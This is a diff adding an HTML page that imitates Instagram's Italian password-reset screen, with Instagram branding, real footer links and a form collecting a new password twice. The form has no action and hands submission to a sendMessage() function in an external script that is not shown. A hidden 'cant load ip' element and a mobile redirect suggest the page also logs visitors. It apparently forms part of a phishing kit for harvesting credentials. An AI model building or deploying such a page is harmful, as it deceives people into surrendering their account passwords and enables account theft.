@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+	<script type="text/javascript">
+		if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
+			document.location=("mobile.html");
+		}
+	</script>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Instagram</title>
+	<link rel="shortcut icon" type="image/x-icon" href="img/36b3ee2d91ed.ico"/>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="top-bar">
+		<div class="top-bar-wrapper">
+			<div class="top-bar-left"></div>
+		    <div class="top-bar-logo"></div>
+			<div class="top-bar-right">
+				<i></i>
+				<strong>Accedi</strong>
+			</div>
+		</div>
+	</header>
+	
+	<div class="wrapper">
+		<div class="side-bar"></div>
+		<div class="page-content">
+			<h1>Instagram</h1>
+			<div class="alert">
+				<p id="alert">Crea una password di almeno 6 caratteri.</p>
+			</div>
+			<form data-encrypt="" action="" method="POST" accept-charset="utf-8">
+				<p>
+					<label>Nuova password:</label> <input type="password" id="password">
+				</p>
+				<p>
+					<label>Conferma della nuova password:</label> <input type="password" id="password1">
+				</p>
+				<p class="butt">
+					<input type="submit" value="Reimposta la password" class="button" onclick="sendMessage()" >
+				</p>
+				<input type="hidden" name="csrfmiddlewaretoken">
+			</form>
+		</div>
+	</div>
+
+	<p id="ciao" hidden>cant load ip</p>
+
+	<footer class="page-footer">
+		<ul class="footer-elements">
+			<li><a href="https://www.instagram.com/about/us/">Informazioni</a></li>
+			<li><a href="https://help.instagram.com/">Assistenza</a></li>
+			<li><a href="https://about.instagram.com/blog/">Stampa</a></li>
+			<li><a href="https://www.instagram.com/developer/">API</a></li>
+			<li><a href="https://about.instagram.com/about-us/careers">Lavora con noi</a></li>
+			<li><a href="https://www.instagram.com/legal/privacy/">Privacy</a></li>
+			<li><a href="https://www.instagram.com/legal/terms/">Condizioni</a></li>
+			<li class="copyright">© 2022 Instagram</li>
+		</ul>
+	</footer>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script src="script.js"></script>
+	 
+	</body>
+</html>
